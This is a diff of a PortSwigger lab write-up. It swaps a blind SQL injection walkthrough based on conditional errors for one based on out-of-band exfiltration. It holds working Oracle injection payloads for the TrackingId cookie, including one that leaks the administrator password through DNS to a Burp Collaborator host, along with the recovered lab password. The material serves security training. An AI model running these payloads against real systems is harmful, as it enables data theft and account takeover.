@@ -1,76 +1,34 @@
 
-### Blind SQL injection with conditional errors : PRACTITIONER
+### Blind SQL injection with out-of-band data exfiltration : PRACTITIONER
 
 ---
 
-> Test that the cookie is vulnerable.
-> Try adding `'`, we get an error. This implies that there is a vulnerability.
-> Try closing `''`, and it works normally. This is implies there is a vulnerability, but we need to ensure that the SQL code is indeed interpreted.
+Since the application executes the SQL asynchronously and has no effect on the application response, we can try and trigger and out of band network interaction.
 
-> Try inputting a query that is correct, so if it works, we know that our SQL statements are interpreted.
-```
-rA16s0b3PCRhyQB4' AND (SELECT '')='' --
-rA16s0b3PCRhyQB4' || (SELECT '') || ' --
-```
-> This query is correct, but its also causing an error. Might be oracle dbms, so try adding the `FROM DUAL` after the select.
-```
-rA16s0b3PCRhyQB4' AND (SELECT '' FROM DUAL)='' --
-rA16s0b3PCRhyQB4' || (SELECT '' FROM DUAL) || ' --
-``` 
-> The page responds normally, meaning that it is an oracle dbms, and that our sql code was interpreted.
 
-> We now are sure that it is vulnerable, as both a wrong and correct query where inputted, and they were interpreted. The wrong one was without the `FROM DUAL` clause.
+> Capturing a `GET` request using BURPSUITE PROXY HTTP history, we see the `TrackingId` cookie that is vulnerable.
 
-> We now want to check if there is a users table.
-```
-rA16s0b3PCRhyQB4' AND (SELECT '' FROM users WHERE ROWNUM=1)='' --
-rA16s0b3PCRhyQB4' || (SELECT '' FROM users WHERE ROWNUM=1) || ' --
-```
-> Cannot use the `LIMIT 1` syntax as it is not supported by oracle.
+![](./screenshots/lab17-1.png)
 
-> Now we check for the presence of the administrator user.
-> For an easier expression, use string concatenation instead of equality checks.
-```
-rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' --
-```
-> This returns an error, meaning that the 'administrator' user exists. To elaborate, try a wrong user, such as `asfas`. The query will work normally, because the FROM part is not correct, and hence the select case portion won't run.
-> Our blind injection works through error conditioning. We allow the error condition to happen once something that we desire is true. In our case, we desired the 'administrator' user to exist. If it exists, we trigger an error, signalling us that what we desire occurs.
+Opening the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) and trying the different out of band payloads and placing them in the `TrackingId` cookie with the burp collaborator domain.
 
-> Now we need to enumerate the password of the admin user.
+We also enter our payload to get the password for the `administrator` user.
 ```
-rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > 20) || ' --
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.go8loz9vn6mt7hst7vugtmtsljrcf33s.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
-> Keep trying, or use the BURPSUITE INTRUDER spider tool to change the length until we don't get an error. Again, if we get an error, this means we are on the right path.
-> Our password has length of 20, now to enumerate all its characters, use the BURPSUITE INTRUDER clusterbomb tool to change both the index and character.
+- We concatenated the result of the query that obtains the password of the administrator user as a subdomain of the Burp Suite collaborator domain.
+
+
+Opening collaborator and polling we see the following DNS requests, confirming that we executed SQL statements.
+
+![](./screenshots/lab18-1.png)
+
+And the password is selected.
+
 ```
-rA16s0b3PCRhyQB4' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1) = 'a') || ' --
+q66xkdcyutnmz6rkju7h
 ```
 
-> Let the indices be from 1 to 20.
-> Let the characters be from a-z and 0-9
+Logging in as `administrator:q66xkdcyutnmz6rkju7h` completes the lab.
 
-> As [[Portswigger/SQL Injection/Lab 12]], conduct the attack and watch for the different response sizes or status codes. See the size corresponding to errors and use those to obtain results. Use status code 500 representing errors to obtain results.
-
-1 - 7
-2 - s
-3 - s
-4 - j
-5 - u
-6 - 0
-7 - m
-8 - y
-9 - z
-10 - 3
-11 - h
-12 - g
-13 - q
-14 - x
-15 - 1
-16 - q
-17 - 0
-18 - i
-19 - l
-20 - l
-
-> Assemble password and login to complete lab.
 ---
